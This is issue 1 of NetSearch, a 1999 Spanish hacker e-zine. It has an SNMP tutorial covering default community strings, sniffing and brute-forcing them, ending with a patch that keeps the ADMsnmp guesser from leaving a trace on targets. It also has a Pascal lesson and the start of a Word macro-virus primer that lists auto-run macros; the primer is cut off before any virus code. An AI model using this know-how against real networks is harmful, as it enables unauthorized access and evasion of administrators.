==========================[ The NetSearch E-Zine ]============================
==========================[      NUMERO  1       ]============================


			    "KNOWLEDGE IS POWER"


x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-


[ Ninguno de los autores que han colaborado se hacen responsables de lo que
  ignorantes o desaprensivos puedan hacer una vez hayan leido sus respectivos
  articulos.                                                                 ]


 + INFORMACION ACERCA DE NETSEARCH


 - WEB OFICIAL:
 
		http://members.xoom.com/lynux (con Y de Yntel Ynside :)
 
 - CANAL OFICIAL:

		#netsearch, en el IRC-Hispano

 - MAIL OFICIAL:

                netsearch@hushmail.com

 - DISTRIBUIDORES OFICIALES:

		http://members.xoom.com/lynux

		(De momento ninguno mas, si os animais mandad un mail
		 diciendonoslo y saldra aqui)

 - LLAVE PGP OFICIAL:

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: PGPfreeware 6.0.2i

mQGiBDdNtK8RBADmtbXlNKi+UO3lcGNh+aYC3YSWxpEN8mQNw1GNFPafO7Ftmrgm
6Hhb3JLvcbKks4q9yFXK58wmavHWWpSY+9NNKSl+kvePhvQ4yfG8x+fQLuUAYPJB
0XTAsO8diSs0PvpvyLVw2prOHeYJCM1BUN/WNA5oio6tXK3oUIQq0rTndQCg/zy7
xSjIpPpc4ZqXJ6PHPZKAgbcD/3CSW6G6BFubj6pF/Wk4UMpx53ZjdyuPJ2iRvR9S
im4gGsRZfSFQEc2eWc5xb75LO/E50FZTVNQozIYrPfTYPake4T/Y9SA6wPfXF3Nq
0ZD/tzwGcdi2SdzyYLS2jHThkV5UVLyXTwzvK7vAbPJLF/83eUgwvMGoZkRHkeB/
PJ9jA/4gkkt4pEouNQmKmUdp9vWEatiA6Ext61rERcpfo88XDGwrcnb6Mv+VOc02
XUe48tZHlkjyEiB7ifAQs/omFx4VLvhpSnJwM6uamuzNXceNlcrl5OVk2LeC5uTA
p/nQRbU8IqtZ1zxf5Gw5ZDsvv83c4Iq+HtzVZjgiIESo9Nac5rQiTmV0U2VhcmNo
IDxuZXRzZWFyY2hAaHVzaG1haWwuY29tPokASwQQEQIACwUCN020rwQLAwIBAAoJ
EPVhoR6NPrDn9AQAoOJOScrhApVlxNd3160jstjNF+RDAJ4/jWftDyIGQaFaSAR0
Wa7LgjVJYLkCDQQ3TbSvEAgA9kJXtwh/CBdyorrWqULzBej5UxE5T7bxbrlLOCDa
AadWoxTpj0BV89AHxstDqZSt90xkhkn4DIO9ZekX1KHTUPj1WV/cdlJPPT2N286Z
4VeSWc39uK50T8X8dryDxUcwYc58yWb/Ffm7/ZFexwGq01uejaClcjrUGvC/RgBY
K+X0iP1YTknbzSC0neSRBzZrM2w4DUUdD3yIsxx8Wy2O9vPJI8BD8KVbGI2Ou1WM
uF040zT9fBdXQ6MdGGzeMyEstSr/POGxKUAYEY18hKcKctaGxAMZyAcpesqVDNmW
n6vQClCbAkbTCD1mpF1Bn5x8vYlLIhkmuquiXsNV6TILOwACAgf+J1V8az258WwN
oq94skl6hgk0nH8spoP+gLHqtVJFwb1zM1O+dwJHSiiEGkwpY72rOijQcbghJ4XF
SNZMIKgqMsVakQRQhoagQ+vrWEGZpZxD42GQX63eJyKgsp6ihcez+arKKScm5NF0
xmkB2un65H3hVjv7gD1g9TyRbIbcqvSmQkEZ5ll+xAMx4gmgziBrrfPoGYBpqAhZ
IfFSIJDruJQSzPtPJpeZelHfeJvAMeLkKVBxT+Mgwftf91o8X/pU7BzhF/NjdsaA
Gu16yjq3AI6+Wn6ovR8pF87VrviiI+vyf82YXmvuVjhpW1qEhGRwTGFdWxE6c4iQ
BhAHgAuz44kARgQYEQIABgUCN020rwAKCRD1YaEejT6w58kRAKCvCnP3pzN64IOF
HgCtgNhYwXNzIQCeIKD1tbTqiBYZVFBG9mVdKhkPOGw=
=PjV/
-----END PGP PUBLIC KEY BLOCK-----


 - COLABORACIONES:

                * Ulandron (UnderSec)
                * DarK FeaR
                * MegadetH
                * }Moeb|uZ{
                * RaiSe
                * cafo
                * [LsD]-MT (Traduccion del e-zine a formato HTML)

 - SALUDOS:

		* - J.J.F. / HACKERS TEAM -
		* SET
                * UnderSec / NGS Team
                * A la pe¤a del #hacker_novatos


 - RECOMENDADO EL USO DEL EDIT DE MS-DOS O EL JOE DE LiNUX.


x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-


 + INDICE:


   +----------------------------------------------------------------+
   |  TITULO                                               AUTOR    |
   |----------------------------------------------------------------|
   |                                                                |
   | + Editorial <--------------------------------------> DarK FeaR |
   |                                                                |
   | + NetSearch al Habla <-----------------------------> NetSearch |
   |                                                                |
   | + Introduccion al SNMP <---------------------------> Ulandron  |
   |                                                                |
   | + Curso de Pascal (I) <----------------------------> DarK FeaR |
   |                                                                |
   | + Iniciacion a los Virus de Macro (I)<-------------> }Moeb|uZ{ |
   |                                                                |
   | + Breves sobre Internet Firewalls <----------------> MegadetH  |
   |                                                                |
   | + Sniffers <---------------------------------------> RaiSe     |
   |                                                                |
   | + Criptografia <-----------------------------------> cafo      |
   |                                                                |
   | + Correo Fresco <----------------------------------> Lector@s  |
   |                                                                |
   | + Llaves PGP <-------------------------------------> NetSearch |
   |                                                                |
   | + Despedida <--------------------------------------> NetSearch |
   |                                                                |
   +----------------------------------------------------------------+


==============================================================================
------------------------------------------------------------------------------
==============================================================================


 + EDITORIAL


     Hola. Bienvenidos a este nuevo e-zine que nace un esplendido dia de mayo
:), esperando poder codearse con los maestros de la scene, lease JJF y SET ;).
Bueno, me presento, soy DarK FeaR, editor de [ The NetSearch E-Zine ]. Y os
preguntareis, ¨ que c*¤* es NetSearch ?. Pues bien, NetSearch no es ningun
grupo en si, en realidad nacio como un canal en el IRC-Hispano. Pero se han
ido creando mas y mas cosas a su alrededor (una lista de correo, por ejemplo)
y creemos que ha llegado el momento de crear un e-zine con el proposito de
aprender unos de otros y de aportar algo mas de informacion y documentacion al
"hack" hispano.

     En este e-zine se trataran temas relacionados con:

   + Seguridad informatica
   + Hack
   + Phreak
   + Cracking
   + Virii
   + IRC
   + Programacion
   + Sistemas operativos (y cuando digo SOs quiero decir SOs de verdad ;)
   + Etc, etc., etc... (todo lo que este relacionado con temas "under")

    Ah, y que sepais que este e-zine esta abierto a aceptar colaboraciones
externas de lector@s, asi que si teneis algun texto por ahi y no sabeis
donde enviarlo, aqui sera bien recibido. A partir de ahora las
colaboraciones se haran imprescindibles, no os lo penseis dos veces.


[ NOTA: Los que querais escribir algun articulo para que sea publicado
        unicamente debe seguir estos requisitos:

 + Estar escrito como maximo a 78 columnas
 + NO contener acentos, ni caracteres 8-bit, exceptuando nuestra querida e¤e.

        Y ya esta. Yo creo que son faciles de cumplir no? :) ]


     Y, dicho esto, solo me queda dejaros con el e-zine. Pero antes, un par de
direcciones de e-mail. Si quereis mandar algun articulo para que lo
publiquemos en el e-zine, la direccion de correo es netsearch@hushmail.com.
Por otra parte, todo aquel que quiera puede suscribirse a nuestra lista de
correo, netsearch@onelist.com, donde se trataran preguntas de la misma
tematica que las del e-zine. De momento somos 91 subscritos, y la lista esta
moderada por Sp4rK (hola Sp4rK :) y por mi.

Venga, disfrutemos de la informacion.

			       - El Editor - (esto me suena... ;)


==============================================================================
------------------------------------------------------------------------------
==============================================================================


 + NETSEARCH AL HABLA

     Bueno, en esta seccion se trataran temas relacionados con el mundillo de
NetSearch, como pueden ser propuestas para algo, colaboraciones, anuncios,
etc. Este mes os hablaremos del concurso del RC5, del que seguramente ya
habreis oido hablar.

     Para los que todavia no lo sepais, el reto del RC5 es un concurso
llevado por distributed.net. El concurso tiene relacion con una ley de los
Estados Unidos que prohibe las claves de cifrado que superen un numero de
bits. Bien, pues este numero, que las autoridades creen irrompible, en poco
tiempo no valdra para nada, con la consecuente perdida de seguridad que esto
comportara. En este concurso se intenta, con la ayuda de la gente, romper
ACTUALMENTE ese numero de bits para que las autoridades norteamericanas
modifiquen esa inutil ley.

     Y algunos diran, bueno, y a mi que me importa, yo no vivo en USA....
Bueno, pues resulta que para el que lo consiga hay un premio de una cantidad
de dolares bastante grande. Ademas, existe otro motivo por el que la gente
participa. En el reto, el cliente que cada participante ejecuta en su maquina
va rompiendo bloques de 2^28 a 2^31 llaves (dependiendo de la maquina). Y como
no podria ser de otra forma, gracias a las cualidades de la "raza humana" :),
han empezado los piques entre unos y otros para ver quien rompe mas bloques.
Bien, por si no os habiais enterado ya, hay muchos grupos hispanos que
estan participando en el reto, entre ellos - J.J.F / HACKERS TEAM -, SET y,
como no, nosotros ;) Desde aqui hacemos un llamamiento a que os afilieis a
nuestro equipo, a ver si logramos superar a los anteriormente nombrados ;)

     Para el que le interese, que vaya a la pagina de NetSearch
(http://members.xoom.com/lynux) y que siga las instrucciones en la seccion
dedicada a este tema, RC5. Para los mas directos, el numero de identificacion
de NetSearch en el reto es el 11007.

     Ala, que rompais mucho ;)


==============================================================================
------------------------------------------------------------------------------
==============================================================================


 + INTRODUCCION AL SNMP



			INTRODUCCION AL SNMP
		--------------------------------------
	ulandron, 1999                          Undersec / NGS Team



Introduccion
------------
	Este texto pretende ser una pequeña introduccion al protocolo
snmp, a sus utilidades, al igual debe servir para  destacar sus ventajas 
y defectos. Y digo pequeña porque el tema del snmp da como para llenar
varios libros, que indudablemente no es mi objetivo. Pero no te
preocupes, ya que se incluyen suficientes enlaces para que puedas
profundizar en el tema. Y si tiene el texto tiene una buena aceptacion
estare encantado de escribir otro, complementando y expandiendo este.

Lo que me ha motivado a escribir este texto es la falta de documentacion
en castellano que existe sobre el tema.

Descripcion
-----------
	El Simple Network Management Protocol es usado principalmente
para monitorizar y controlar el status de dispositivos conectados a
internet, en especial routers, aunque se puede usar en cualquier tipo de host
que permita correr el snmpd. Ha sufrido numerosos cambios en los
ultimos años, cambios que intentare tratar con mas o menos profundidad a
lo largo del texto, pero quiero dejar claro que el objetivo del texto son
las siguientes versiones:

SNMPv1: La primera version del protocolo. Vease rfc 1157.
SNMPv2C : Autentificacion basada en los llamados "community strings".
SNMPv2U :        "          "    orientada a usuarios.
REF: RFC's 1901, 1905, 1906, 1909, 1910.

Aparte de estas existen otras versiones, con mayor o menor grado de
aceptacion:
SNMPsec: Es una version poco aceptada / conocida, implementa una
seguridad mucho mas fuerte. RFC's 1351,1352, 1353.
SNMPv2p : En esta version se introdujeron muchas mejoras, pero es anterior
a las 2C & 2U.
SNMPv2* : La version mas avanzada del SNMPv2, combina lo mejor de todas
las anteriores. Nunca se publicaron RFC's al respecto.
SNMPv3 : La mas nueva e interesante, es el estandar de SNMP del futuro.
Una lastima que todavia no haya suficiente informacion sobre esta nueva
version como para escribir un articulo.

	Es en principio una tipica aplicacion cliente-servidor, donde el
servidor(el agente de snmp) presenta informacion acerca de si mismo en un
arbol jerarquico, informacion como el nombre del administrador, de la
maquina, las configuraciones de sus tarjetas de red, etc...
El servidor de snmp, el snmpd, usa para la comunicacion con el cliente
(el llamado manager) el protocolo udp, y generalmente escucha en los
puertos 161 y 162 (este ultimo para el snmptrapd, que explicare a  
continuacion).
Traps son paquetes enviados por el agente para informar de acontecimientos
inusuales en su entorno, ya sea un reboot, que haya demasiado trafico en
la red, un router que deja de responder, por poner unos ejemplos. Son la
excepcion a la regla que expongo en el siguiente parrafo, ya que los envia
el agente sin haberlos solicitado previamente el manager.
Para solicitar informacion del agente(el servidor, por ultima vez),
el manager emplea un mecanismo denominado get-request(no se me ha ocurrido
ninguna traduccion logica), a lo que el agente responde con un (logico)
get-response. 
Toda la informacion del agente se guarda en una base de datos denominada
Management Information Base(MIB), formando una estructura de arbol, y
presentada en forma de objetos, siendo la raiz el nodo .iso.
Un ejemplo de una rama seria por ejemplo el siguiente:

system.sysContact.0 = "Ulandron"

Esto en realidad no es un buen ejemplo, porque no muestra toda la
estructura del objecto, con todos los nodos descendiendo hasta el .iso
Pero sirve para hacerse una idea de como funciona.
El ejemplo especifica el objeto escalar .sysContact (escalar porque solo
puede adoptar un valor en un determinado instante), del nodo system (el
system puede tener varios nodos, como serian el .sysName, el .sysLocation
etc etc..), cuyo valor es "Ulandron". 
Al no tener un "." delante del system, se especifica que es
un nodo relativo, es decir, que se nos oculta una parte del nodo que es
comun a todos los objetos de ese sub-nodo, que seria el system. Esto usa
una filosofia similar a la configuracion de los Servidores de nombre, en
los cuales puedes omitir el nombre de dominio si no terminas el nombre del
host en punto, con lo que el dns lo completa automaticamente. Pero no me
quiero ir por las ramas.
Otros ejemplos de objetos pertenecientes al nodo system serian:
system.sysName.0 = "localhost"   /* El nombre del host */
system.sysUpTime.0 = Timeticks: (45584) 0:07:35 /* El tiempo que lleva
						encendido */
system.sysDescr.0 = "Linux version 2.2.2 (root@localhost) (gcc version
2.7.2.1) #5 SMP Tue Feb 16 22:44:54 CET 1999" /* La descripcion */

Como puedes ver en todos se omite el  "." al principio, con lo que el
programa se encarga de anteponer el .iso.org.dod.internet....

Pasemos a otro tema: Como se decide quien puede y quien no puede
ver/cambiar en esta base de datos llena de informacion util.
Inicialmente se usaba un metodo de autentificacion (bastante gracioso por
cierto) que se basaba en community strings. Esto son una especie de claves
(sin nombre de usuario) que asignas a un determinado acto, que puede ser
unda de dos: leer o escribir a la MIB.
Es decir, una vez que habias adivinado el community string, tenias acceso
total a la base de datos, pudiendo leer de la misma, cambiarla u hacer
otras cosas interesantes que comentare en el siguiente apartado.
Y lo mas gracioso es que el manager envia la clave al agente sin
encriptar, en plain text, con lo que eso conlleva. Mas sobre SNMP sniffer
en el proximo apartado.
Por cierto, los community strings por defecto son "public" y "private".
Esto era asi en el SNMPv1. 
Posteriormente en SNMPv2 se discutieron varios modelos de autentificacion,
empezando con uno basado en listas de control de acceso, en el cual los
derechos que tiene cada manager sobre el agente se basan es su direccion
ip, en diversas claves de autentificacion, en la accion solicitada por el
manager (get o set), etc...
Pero una vez mas este modelo esta anticuado, y se ha pasado a otro modelo
denominado USEC, User based Security Model, mejorando considerablemente la
autentificacion, control de acceso y privacidad de todo el sistema.
 

Utilidad practica
-----------------
	Estoy seguro que se ya se esta acabando tu paciencia en lo que a
teoria respecta, y que tienes ganas de verle una utilidad practica a
esto. Pues adelante, dejame introducirte en las aplicaciones practicas de
todo este rollo.
Como ya he mencionado el snmp se basa en un servidor (agente), el snmpd,
del que ya he hablado suficiente.
Para el cliente existen varias herramientas. Normalmente un administrador
de red tendra su bonita interfaz grafica de Microsoft(r), con la que se
sentira el rey y no tendra ni que saber lo que significa SNMP, solo que
con ese programita puede consultar datos de los hosts de su red, y en caso
de que haya algun problema llamar al jodido loco que se encarga de
administrar las maquinas esas raras que no traen ni portaminas por
defecto, creo que se llamaban unix o algo asi. Brrrrr.

Pero como tu no eres uno de estos (ya que si no no hubieras leido hasta
aqui), voy a pasar a comentar un poco algunos de los programas que se
pueden usar para conocer mas sobre el protocolo y por consiguiente sobre
la maquina que lo implementa.

Las utilidades basicas para trabajar con una MIB a la que tengas acceso,
son las siguientes:
snmpget      
-------
Este programa sirve para obtener informacion de la base de datos, mediante
las get-requests que he mencionado mas arriba.

snmpget [-p <puerto>] host  community  nombre-de-varialbe  [variable]...
ej:

localhost:/root # snmpget localhost public system.sysContact.0
system.sysContact.0 = "Ulandron"

snmpset      
-------
Programa que se puede usar para modificar el contenido de la base de
datos.
snmpset [-p puerto] [-d] [-r reintentos] [-t timeout]  host
       community nombre-de-variable tipo valor [variable tipo valor]...
	opciones:
		 -p puerto    -- especifica el puerto (161 por defecto)
		 -t timeout   -- Tiempo de espera
		 -r reintentos-- Reintentos
		 -d           -- Mostrar paquetes (dump)
	Son posibles los siguientes tipos: i, s, x, d, n, o, t, a
		i: INTEGER, s: STRING, x: HEX STRING, d: DECIMAL STRING
		n: NULLOBJ, o: OBJID, t: TIMETICKS, a: IPADDRESS

ej:
localhost:/root # snmpget localhost public system.sysContact.0
system.sysContact.0 = "Ulandron"
localhost:/root # snmpset localhost public system.sysContact.0 s NiteBlade
system.sysContact.0 = "NiteBlade"
system.sysContact.0 = "NiteBlade"
localhost:/root # snmpget localhost public system.sysContact.0
system.sysContact.0 = "NiteBlade"

Estos datos ademas se guardan (al menos en mi implementacion, CMU-SNMP) en
un archivo en el hosts, que en mi caso es el archivo de configuracion:
/etc/snmpd.conf

snmpwalk
--------
Programa muy util para examinar una base de datos, sin tener que pedir
cada variable una a una.

snmpwalk [-p <puerto>] host community [variable]
ej:
localhost:/root # snmpwalk localhost public system
system.sysDescr.0 = "Linux version 2.2.1 (root@localhost) (gcc version
2.7.2.1)
#5 SMP Tue Feb 16 22:44:54 CET 1999"
system.sysObjectID.0 = OID: enterprises.tubs.ibr.linuxMIB
system.sysUpTime.0 = Timeticks: (64074) 0:10:40
system.sysContact.0 = "Ulandron"
system.sysName.0 = "localhost"
....

snmpnetstat  
-----------
snmpnetstat hostname community [-airsn] [-I interfaz] [-p protocolo]
[intervalo]
	opciones:
	-a      : informacion de todos los sockets
	-i      : idem de las interfaces
	-r      : Mostrar la tabla de enrutamiento
	-s      : Estadisticas ordenadas por protocolo
	-n      : Mostrar direcciones numericas
ej:
localhost:/root # snmpnetstat localhost public -i
Name        Mtu   Network     Address            Ipkts Ierrs    Opkts
lo0         3924  none        none             3568576 25575        0
eth0        1500  none        none                   0     0        0
sit0*       1480  none        none                   0     0        0
.......

snmptest 
--------
Util para depurar problemas con el snmp

snmptest host community

ej:
localhost:/root # snmptest localhost public
Please enter the variable name: system.sysContact.0
Please enter the variable name:
Received GET RESPONSE from 127.0.0.1
requestid 0x2 errstat 0x0 errindex 0x0
system.sysContact.0 = "Ulandron"

Estas son las utilidades que vienen con la distribucion del snmp por
defecto, y que son suficientes si conoces el community string. El problema
surge si desconoces dicho string, porque no podras acceder a la base de datos.
Para descubrirlo tienes muchas opciones:
Instalar un sniffer.
Si tienes acceso a la red puedes instalar un sniffer para snmp, siempre
que el entorno te lo permita (smart switching hub's, etc.) y que se use
el SNMPv1, ya que el v2 encripta la clave. Te preguntaras pq poner un
sniffer para esto pudiendo instalar uno normal y corriente. Imaginate que
usan ssh para el login, https para los servidores web, tuneles seguros
para pop, etc etc etc. Aunque si te encuentras a gente asi, seria muy
raro que descuidasen sus agentes de snmp, pero quien sabe.
Por supuesto los sniffers sirven para depurar problemas con el snmp, y
para aprender mas sobre el mismo.

Esto son el tipo de paquetes que genera el snmp (tcpdump).

17:19:41.232999 cloud.1042 > localhost.snmp: GetRequest(19)
.iso.org.dod[|snmp]
/* Cloud establece una conexion desde su puerto 1042 al agente snmp en el
puerto 161, mandando un getrequest */
17:19:41.233385 localhost.snmp > cloud.1042: GetResponse(17) [|snmp]
/* Localhost responde con un Getresponse, que contiene los datos pedidos, o el
error correspondiente si no los puede facilitar por una razon u otra */

Otra manera es intentar adivinar el community string a lo bestia, para
ello existe un un pgroma de ADM llamado ADMsnmp (original ehhh), al que le
das un diccionario para que pruebe, ademas de crear variaciones del nombre
del host para intentarlo. El programa tiene un pequeño efecto secundario
desagradable, y es que si consigue conectar con el objetivo cambia el
objeto system.sysName.0 a "ADMsnmp", lo cual da mucho el cante.
El problema es un error en el fuente por lo que puedo ver. Si esto no es
asi ruego se me corrija.
El parche esta al final del documento. Tambien añade un "\n" a la ultima linea
de la ayuda, queda mejor ;).


Por ultimo, para quien no le haya quedado claro la utilidad de todo esto:
Mediante el snmp puedes obtener informacion valiosisima sobre un host,
como son las interfaces de red, las tablas de encaminamiento, datos del
sistema operativo, etc etc etc.
Puedes reiniciar la maquina, puedes cambiar las variables adaptandolas a
tu proposito, ...
Incluso en algunas situaciones puedes ejecutar programas en el host, con
lo que esto implica.

Si veo que el texto tiene buena aceptacion me currare una nueva version,
mas tecnica, con detalles sobre el snmpv3, aplicaciones practicas mas
precisas etc....

Todos los programas de mecionados en este texto se encuentran en el zip
ajunto, al igual que otros archivos de interes para el novicio de snmp.

[ NOTA: El zip del que habla Ulandron lo podeis encontrar en el site
        de UnderSec, http://www.undersec.com ]

					Ulandron

ulandron@undersec.com
http://www.undersec.com

-------------------------------------------------------------------------
Queda prohibida cualquier reproduccion parcial o total de este texto, 
ya sea en medio electronico, escrito..., sin la autorizacion
previa del autor.
-------------------------------------------------------------------------

<---- CUT HERE ---->
--- snmp.c      Wed Feb 17 08:20:05 1999
+++ snmp-fixed.c        Tue Mar  9 17:57:43 1999
@@ -309,7 +309,9 @@
 req_makepktsnmp (int sock, char *buf, int sizeofbuf, char *namez, int id, struct sockaddr_in *sin)
 {
   /** system.sysName.0 :> **/
+
   u_char sysdec[] = "\x30\x10\x30\x82\x0\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x05\x00\x05\x00";
+
   return (makepktsnmp (sock, (u_char *) & sysdec, sizeof (sysdec), buf, sizeofbuf, namez, id, sin, 0));
 }

@@ -322,7 +324,7 @@
 {
   int i;
   u_char *save;
-  u_char sysdec[] = "\x30\x10\x30\x82\x0\x09\x06\x08\x2b\x06\x01\x02\x01\x01\x05\x00";
+  u_char sysdec[] = "\x30\x10\x30\x82\x0\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x05\x00\x05\x00";

   save = (u_char *) calloc (1, sizeof (sysdec) + strlen (namez) + 2);

@@ -544,7 +546,7 @@
      "[-waitfor] <mili>  : time in milisecond in each send of snmprequest\n"
	  "[-sleep]   <second> : time in second of the scan process life\n"
	  "[-manysend] <number>: how many paket to send by request \n"
-     "[-inter] <mili>     : time to wait in milisecond after each request");
+     "[-inter] <mili>     : time to wait in milisecond after each request\n");
 }

 int
<---- CUT HERE ---->


==============================================================================
------------------------------------------------------------------------------
==============================================================================


 + CURSO DE PROGRAMACION EN PASCAL


                           CURSO DE PASCAL (I)


     Hola, bienvenidos al curso de programacion en Pascal que empieza en
este primer numero del e-zine. Algunos de vosotros os preguntareis: ¨ Y de
que me va a servir el Pascal, si, por ejemplo, el lenguaje nativo de los *nix
es el C ? Pues yo os respondere :) que, el Pascal es el lenguaje perfecto para
aprender a programar en general, ya que es muy ordenado y ense¤a, digamos,
las buenas costumbres de programacion.

     Os dire que este curso ira orientado al compilador Turbo Pascal 7.0 para
MS-DOS, aunque lo mas seguro que la mayoria de cosas sirvan tb para el GNUPas,
el compilador de Pascal para Linux por gentileza de GNU :) Tambien existe una
version del compilador creada por GNU pero esta vez para MS-DOS, asi que os
recomiendo que si no teneis el Turbo Pascal opteis por conseguir este con
licencia GPL.

     Hechas ya las aclaraciones pertinentes :), empecemos a darle ca¤a al
Pascal, no sin antes explicar un poco (pero que muy poco) la creacion de este
lenguaje de programacion. Bien, pues este (a mi modo de ver) estupendo
lenguaje fue creado por Niklaus Wirth y su grupo de sabiondos de Zurich un
esplendido dia de 1971. El nombre del lenguaje se debe al cientifico frances
Blaise Pascal (matematico, teologo, filosofo, y muchas mas cosas).

     Bien, pues este es un lenguaje de proposito general, al contrario de
otros como el DIV, que es unicamente para la creacion de juegos, pero igual
al C o Basic, tambien de proposito general (creacion de, en teoria, todo tipo
de aplicaciones).

    Y empezando ya, os voy a poner un ejemplo del esquema de un programa en
Pascal:



Program Esquema;

Uses Crt;

Const
[ declaracion de constantes ]

Var
[ declaracion de variables ]

Begin
 [ cuerpo del programa ]
End.




     Si es la primera vez que veis algun lenguaje de programacion os habreis
quedado igual, asi que os voy a explicar mas o menos lo que habia en el
ejemplo. Empecemos con las VARIABLES. Bien, una variable no es mas que una
zona de la memoria donde es posible guardar datos, a los que posteriormente
nos podremos referir con el nombre de esta variable. Por ejemplo, si
declaramos una variable que se llame CONTADOR y le asignamos el valor 5,
cuando despues nos refiramos a CONTADOR seria lo mismo que si nos refirieramos
a un 5. Esto nos servira, por ejemplo, para recoger datos del usuario del
programa.

     Hay una, digamos, clase especial de variables llamadas CONSTANTES. En las
constantes lo que se hace es asignar un valor a esa zona de la memoria, pero
este valor no podra ser modificado en ninguna ocasion, es decir, sera
constante (valga la rebuznancia).

    En Pascal, como en C, existen unas palabras que no pueden usarse como
identificadores (nombres de variables): son las palabras reservadas. Estas
palabras son ordenes que se le dan al compilador, como puede ser que utilice
unas librerias o que ejecute un bucle (una repeticion). Hay muchisimas
palabras reservadas pero solo se utilizaran, normalmente, unas pocas. Un
ejemplo de palabra reservada es la que hemos utilizado al principio del
esquema anterior, PROGRAM. Esta palabra reservada es tan simple y con tan
poca importancia que se puede obviar. Su funcion es indicar el nombre del
programa. La siguiente palabra reservada que podemos ver es USES. Esta si
es importante, ya que indica al compilador las librerias externas que debe
utilizar. Una libreria es un codigo fuente en el que se escriben sentencias
que utilizamos muchas veces, y sirve para ahorrarnos trabajo y tener que
ir repitiendo siempre lo mismo.

     Las siguientes palabras reservadas que se pueden ver son,
respectivamente, para declarar las constantes (CONST) y las variables (VAR).
Una vez hecho esto, se da paso al cuerpo del programa. El codigo del programa
debe estar entre las palabras reservadas BEGIN y END. Mas adelante veremos
que se puede escribir codigo aparte, en los denominados PROCEDIMIENTOS, aunque
eso lo veremos mas adelante.

     Continuando con el tema de las variables, hay que aclarar algo, algo muy
importante. Cada variable tiene su rango, es decir, unos valores que se
mueven entre un limite inferior y un limite superior. Un ejemplo: un rango
puede ir desde el 0 al 255, es decir, esa variable no puede contener valores
inferiores a 0 o superiores a 255. Bien, pues aqui os pongo una tabla de
rangos:

* Variables numericas:

BYTE = 0 hasta 255
SHORTINT = -128 hasta 127
INTEGER = -32768 hasta 32767
WORD = 0 hasta 65535
LONGINT = -2147483648 hasta 2147483647

* Variables numericas REALES:

REAL = 2.9E-39 hasta 1.7E38
SINGLE = 1.5E-45 hasta 3.4E38
DOUBLE = 5.0E-324 hasta 1.7E308
COMP = -9.2E18 hasta 9.2E18
EXTENDED = 3.4E-4932 hasta 1.1E4932

* Variables de CARACTER:

CHAR = Un solo caracter : 'b'
STRING = Una cadena de caracteres: 'Cadena'

* Variables logicas (BOOLEANAS):

BOOLEAN = Tienen 2 valores: TRUE y FALSE (verdadero y falso).


     Un ejemplo de declaracion de variable podria ser:

Var
contador:integer;

     Y para las constantes:

Const
estatico=800;

     Por si aun no habia quedado claro, todas las sentencias (ordenes) deben
finalizar con el caracter ";" (punto y coma). En Pascal tambien se pueden
introducir comentarios, para recordar cosas, pero que seran ignorados por
el compilador. Se le indican con los signos { y } o (* y *). Ejemplo:


{ este es el contador del for }


     Bien, pues esta ha sido la peque¤a introduccion al Pascal, unicamente
explicando los conceptos basicos, y que en proximos numeros profundizaremos
mas.

     Pero como no puede faltar con ningun lenguaje de programacion, el
primer programa que se escriba debe ser el HOLA MUNDO, un simple programa
que imprimira en pantalla la cadena "Hola Mundo!". El listado es el siguiente:


Program Hola_Mundo;

Uses Crt;

Begin
 writeln('Hola Mundo!'); { Esta orden indica que se imprima una cadena de
                           texto, se encuentra en la libreria Crt }
End.


     Bueno, hasta el segundo capitulo en que trataremos las entradas y salidas
(para recoger informacion en las variables) y, si queda tiempo, los bucles o
repeticiones.

     Nos vemos.

                               DarK FeaR


==============================================================================
------------------------------------------------------------------------------
==============================================================================


 + INICIACION A LOS VIRUS DE MACRO (I)

                    Por }Moeb|uZ{ para "The NetSearch E-Zine"

 

    1.- Introduccion 
    2.- Replicacion 
    3.- Stealh 
    4.- BoMbas 
    5.- EjeMplo: Pezque¤in.doc 
    6.- DisclaiMer 



-----[ Introduccion

     Los llaMados virus o troyanos de Macro son virus que se codifican en
aplicaciones coMo Word o Excel, que utilizan dichas Macros para autoMatizar
ciertas tareas.

     Son virus realMente faciles de crear y de extender, pero si realMente te
interesa el Mundo del viriing, aprende a escribir virii en ensaMblador.
DigaMos que escribo esto para conocer el funcionaMiento de este tipo de virus.

     Estan escritos en el lenguaje que utilize la aplicacion para la que son
creados, norMalMente Visual Basic para Aplicaciones (VBA) o, en el caso del
Word, en Word Basic (WB). AMbos lenguajes son Muy parecidos (realMente el WB
es una version de Visual Basic especifica para esta aplicacion) , pero no es
objeto de este articulo aprender a prograMar en estos lenguajes, sino estudiar
algunas tecnicas viricas para dichos lenguajes.

     Por ser los Mas coMunes, voy a coMentar los virus de Word, aunque el
MecanisMo es el MisMo para todas las aplicaciones.

     El Word Basic es un lenguaje interpretado, bastante sencillo, y tiene la
particularidad de que sus instrucciones estan en el MisMo idioMa que el propio
Word. Asi, si codificaMos un virus para el Word en castellano, si es ejecutado
en un Word en ingles nos dara un Mensage de error. Si eres un poco habil,
deberias ser capaz de solucionar este probleMa para hacer un virus Multilingue
;-) . De todas forMas, hay Muchas ordenes que son independientes del idioMa,
por lo que un buen objetivo seria escribir un virus utilizando unicaMente este
tipo de ordenes.

     Las Macros en Word se encuentran en las plantillas (*.dot). Cuando creas
un docuMento nuevo, lo norMal es que este docuMento se abra por defecto con la
plantilla global NORMAL.DOT, aunque se puede abrir con una plantilla diferente
si se desea. Estas plantillas son las que traen el forMato con el que se
inicia el docuMento.

     Para crear un docuMento que contenga Macros, solo hay que crear un
docuMento, y guardarlo plantilla (.dot), y no coMo docuMento (.doc) Una vez
hecho esto, el docuMento ya podra contener Macros. Hay que tener en cuenta que
se puede renoMbrar el archivo, y pasarlo otra vez a .DOC, conservando asi las
propiedades de plantilla y las Macros que contenga. TaMbien se podria crear un
docuMento nuevo, basado en una plantilla infectada, pero en este caso, a mi
parecer, no es el Mas apropiado, puesto que depende ya de otro archivo.

     Hay 5 Macros autoMaticas , que son basicas ( bueno, eso no es realMente
cierto ;-) ) para la creacion de virus (aunque no de "cartas boMba"), ya que
el fin ultiMo de un virus es reproducirse. Estas Macros son:


AutoExec: Una Macro con este noMbre se ejecutara cada vez que se arranque el
          Word.

AutoOpen: Se ejecuta cada vez que se abre el docuMento.

AutoClose: Se ejecuta cada vez que se cierra el docuMento.

